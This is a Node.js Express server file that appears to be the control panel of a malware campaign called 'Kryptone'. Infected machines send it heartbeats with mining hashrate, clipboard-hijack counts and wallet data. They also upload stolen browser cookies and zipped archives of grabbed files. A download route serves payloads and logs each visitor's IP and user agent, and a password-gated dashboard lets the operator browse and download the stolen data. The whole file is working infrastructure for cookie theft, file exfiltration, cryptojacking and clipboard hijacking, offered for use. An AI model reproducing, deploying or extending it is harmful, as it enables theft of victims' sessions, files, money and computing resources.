'use strict';
/**
 * Kryptone panel — password gate, installs, cookies, downloads, grabs.
 * 24/7 behind Docker/Fly/Render/VPS. Data dir is env-configurable.
 */
const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = parseInt(process.env.PORT || '8787', 10);
const PASSWORD = process.env.PANEL_PASSWORD || 'sudo2';
const PANEL_KEY = process.env.PANEL_KEY || 'change-me-6767';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const SESSION_MS = 7 * 24 * 60 * 60 * 1000;
const STALE_MS = parseInt(process.env.STALE_MS || '120000', 10);
const OWN_BTC = process.env.OWN_BTC || 'bc1qxq6u0lknqng4vr295p4rscfe5mjlgnjpelsrlj';
const TRUST_PROXY = process.env.TRUST_PROXY === '1';

const ROOT = __dirname;
const DATA = process.env.DATA_DIR || path.join(ROOT, 'data');
const COOKIES = path.join(DATA, 'cookies');
const GRABS = path.join(DATA, 'grabs');
const DIST = process.env.DIST_DIR || path.join(ROOT, 'dist');
const RIGS_FILE = path.join(DATA, 'rigs.json');
const DL_FILE = path.join(DATA, 'downloads.json');
for (const d of [DATA, COOKIES, GRABS, DIST]) fs.mkdirSync(d, { recursive: true });

// ------------------------------------------------------------------ storage
const readJson = (f, fallback) => {
  try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch (_) { return fallback; }
};
const rigs = new Map();
for (const r of readJson(RIGS_FILE, [])) rigs.set(r.hwid, r);
let downloads = readJson(DL_FILE, []);

let flushT = null;
function flush() {
  if (flushT) return;
  flushT = setTimeout(() => {
    flushT = null;
    fs.writeFile(RIGS_FILE, JSON.stringify([...rigs.values()]), () => {});
    fs.writeFile(DL_FILE, JSON.stringify(downloads.slice(-2000)), () => {});
  }, 700);
}

const own = (w) => !!w && String(w).toLowerCase() === OWN_BTC.toLowerCase();
const view = (r) => {
  const ck = readJson(path.join(COOKIES, safeName(r.hwid) + '.json'), { items: [] });
  return {
    hwid: r.hwid,
    worker: r.worker || r.host || r.hwid,
    host: r.host || '',
    user: r.user || '',
    os: r.os || '',
    wallet: r.wallet || '',
    ip: r.ip || '',
    hashrate: r.hashrate || 0,
    shares: r.shares || 0,
    clips: r.clips || 0,
    cookies: (ck.items || []).length,
    gobFiles: r.grabFiles || 0,
    praise: own(r.wallet) ? 'mine' : (r.wallet ? 'foreign' : 'unknown'),
    mods: r.mods || [],
    firstSeen: r.firstSeen || r.lastSeen,
    lastSeen: r.lastSeen || 0,
    online: Date.now() - (r.lastSeen || 0) < STALE_MS,
    grabs: r.grabs || [],
  };
};
const safeName = (s) => String(s).replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 40);

// ------------------------------------------------------------------ auth
const sessions = new Map();
const attempts = new Map();

function sign(exp) {
  return crypto.createHmac('sha256', SESSION_SECRET).update('admin:' + exp).digest('hex');
}
function makeSession() {
  const exp = Date.now() + SESSION_MS;
  const val = exp + '.' + sign(exp);
  sessions.set(val, exp);
  return val;
}
function parseCookie(header, name) {
  if (!header) return null;
  for (const part of header.split(';')) {
    const i = part.indexOf('=');
    if (i < 0) continue;
    if (part.slice(0, i).trim() === name) return decodeURIComponent(part.slice(i + 1).trim());
  }
  return null;
}
function authed(req) {
  const raw = parseCookie(req.headers.cookie, 'kryptone');
  if (!raw) return false;
  const dot = raw.lastIndexOf('.');
  if (dot < 0) return false;
  const exp = parseInt(raw.slice(0, dot), 10);
  const sig = raw.slice(dot + 1);
  if (!exp || exp < Date.now()) return false;
  const want = sign(exp);
  try {
    if (sig.length !== want.length) return false;
    if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(want))) return false;
  } catch (_) { return false; }
  return true;
}
function guard(req, res, next) {
  if (!authed(req)) return res.status(401).json({ error: 'auth' });
  next();
}

// ------------------------------------------------------------------ app
const app = express();
app.disable('x-powered-by');
if (TRUST_PROXY) app.set('trust proxy', 1);
app.use(express.json({ limit: '8mb' }));
app.use(express.urlencoded({ extended: false, limit: '64kb' }));

app.post('/login', (req, res) => {
  const ip = req.ip || '0';
  const now = Date.now();
  const a = attempts.get(ip) || { n: 0, t: now };
  if (now - a.t > 10 * 60 * 1000) { a.n = 0; a.t = now; }
  if (a.n >= 8) return res.status(429).json({ error: 'slow down' });
  const pass = String((req.body && req.body.password) || '');
  if (pass !== PASSWORD) {
    a.n++;
    attempts.set(ip, a);
    return res.status(401).json({ error: 'nope' });
  }
  attempts.delete(ip);
  res.setHeader('Set-Cookie',
    `kryptone=${encodeURIComponent(makeSession())}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${SESSION_MS / 1000}${process.env.COOKIE_SECURE === '1' ? '; Secure' : ''}`);
  res.json({ ok: true });
});

app.post('/logout', (req, res) => {
  res.setHeader('Set-Cookie', 'kryptone=; Path=/; HttpOnly; Max-Age=0');
  res.json({ ok: true });
});

function requireKey(req, res, next) {
  if (req.get('X-Panel-Key') !== PANEL_KEY) return res.status(401).json({ error: 'bad key' });
  next();
}

// ingest ------------------------------------------------------------------
app.post('/api/heartbeat', requireKey, (req, res) => {
  const b = req.body || {};
  if (!b.hwid) return res.status(400).json({ error: 'hwid' });
  const prev = rigs.get(b.hwid) || { grabs: [], firstSeen: Date.now() };
  const next = { ...prev, ...b, firstSeen: prev.firstSeen, lastSeen: Date.now(), grabs: prev.grabs || [] };
  rigs.set(b.hwid, next);
  flush();
  res.json({ ok: true, special: own(next.wallet) });
});

app.post('/api/cookies/:hwid', requireKey, (req, res) => {
  const hwid = safeName(req.params.hwid);
  const items = Array.isArray(req.body && req.body.items) ? req.body.items : [];
  if (!hwid || !items.length) return res.status(400).json({ error: 'empty' });
  const f = path.join(COOKIES, hwid + '.json');
  const cur = readJson(f, { hwid, worker: '', updated: 0, items: [] });
  const index = new Map();
  for (const it of cur.items) index.set([it.host, it.name, it.profile].join('\u0000'), it);
  for (const it of items.slice(0, 20000)) {
    if (!it || typeof it !== 'object') continue;
    index.set([it.host, it.name, it.profile].join('\u0000'), {
      browser: String(it.browser || ''),
      profile: String(it.profile || ''),
      host: String(it.host || ''),
      name: String(it.name || ''),
      value: String(it.value == null ? '' : it.value).slice(0, 8000),
      path: String(it.path || '/'),
      expires: Number(it.expires) || 0,
      secure: !!it.secure,
      httpOnly: !!it.httpOnly,
      ts: Date.now(),
    });
  }
  const merged = [...index.values()].slice(-30000);
  fs.writeFileSync(f, JSON.stringify({ hwid, worker: req.body.worker || '', updated: Date.now(), items: merged }));
  const rig = rigs.get(hwid) || { hwid };
  rig.cookies = merged.length;
  rigs.set(hwid, rig);
  flush();
  res.json({ ok: true, total: merged.length });
});

app.post('/api/grab/:hwid', requireKey, express.raw({ type: '*/*', limit: '120mb' }), (req, res) => {
  const hwid = safeName(req.params.hwid);
  if (!hwid || !Buffer.isBuffer(req.body) || !req.body.length) return res.status(400).json({ error: 'empty' });
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const name = `${hwid}-${stamp}.zip`;
  fs.writeFileSync(path.join(GRABS, name), req.body);
  const rig = rigs.get(hwid) || { hwid, grabs: [] };
  rig.grabs = rig.grabs || [];
  rig.grabs.unshift({ file: name, bytes: req.body.length, files: parseInt(req.get('X-Files') || '0', 10), ts: Date.now() });
  rig.grabs = rig.grabs.slice(0, 20);
  rigs.set(hwid, rig);
  flush();
  res.json({ ok: true, file: name });
});

// admin -------------------------------------------------------------------
app.get('/api/state', guard, (req, res) => {
  const rigsOut = [...rigs.values()].map(view).sort((a, b) => b.lastSeen - a.lastSeen);
  const dls = downloads.slice(-300).reverse();
  let dist = [];
  try { dist = fs.readdirSync(DIST).filter(f => !f.startsWith('.')); } catch (_) {}
  res.json({
    rigs: rigsOut,
    downloads: dls,
    dist,
    totals: {
      rigs: rigsOut.length,
      online: rigsOut.filter(r => r.online).length,
      mine: rigsOut.filter(r => r.praise === 'mine').length,
      cookies: rigsOut.reduce((s, r) => s + r.cookies, 0),
      downloads: downloads.length,
      clips: rigsOut.reduce((s, r) => s + r.clips, 0),
      hashrate: rigsOut.filter(r => r.online).reduce((s, r) => s + r.hashrate, 0),
    },
  });
});

app.get('/api/cookies/:hwid', guard, (req, res) => {
  const f = path.join(COOKIES, safeName(req.params.hwid) + '.json');
  res.json(readJson(f, { items: [] }));
});

app.get('/api/grab/:hwid/:file', guard, (req, res) => {
  const file = safeName(path.basename(req.params.file));
  const p = path.join(GRABS, file);
  if (!fs.existsSync(p)) return res.status(404).end();
  res.download(p);
});

// download tracking -------------------------------------------------------
app.get('/dl/:file', (req, res) => {
  const file = path.basename(req.params.file);
  const p = path.join(DIST, file);
  if (!fs.existsSync(p)) return res.status(404).send('not here');
  const entry = {
    file,
    ip: req.ip,
    ua: String(req.get('user-agent') || '').slice(0, 300),
    ref: String(req.get('referer') || '').slice(0, 300),
    ts: Date.now(),
  };
  downloads.push(entry);
  flush();
  res.download(p);
});

// pages -------------------------------------------------------------------
app.get('/', (req, res) => {
  if (!authed(req)) return res.redirect('/login');
  res.sendFile(path.join(ROOT, 'public', 'dashboard.html'));
});
app.get('/login', (req, res) => res.sendFile(path.join(ROOT, 'public', 'login.html')));
app.use(express.static(path.join(ROOT, 'public')));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[kryptone-panel] :${PORT}  data=${DATA}  dist=${DIST}`);
  if (PASSWORD === 'sudo2') console.log('[kryptone-panel] password is the default: sudo2');
  if (PANEL_KEY === 'change-me-6767') console.log('[kryptone-panel] PANEL_KEY is default — rotate it');
});
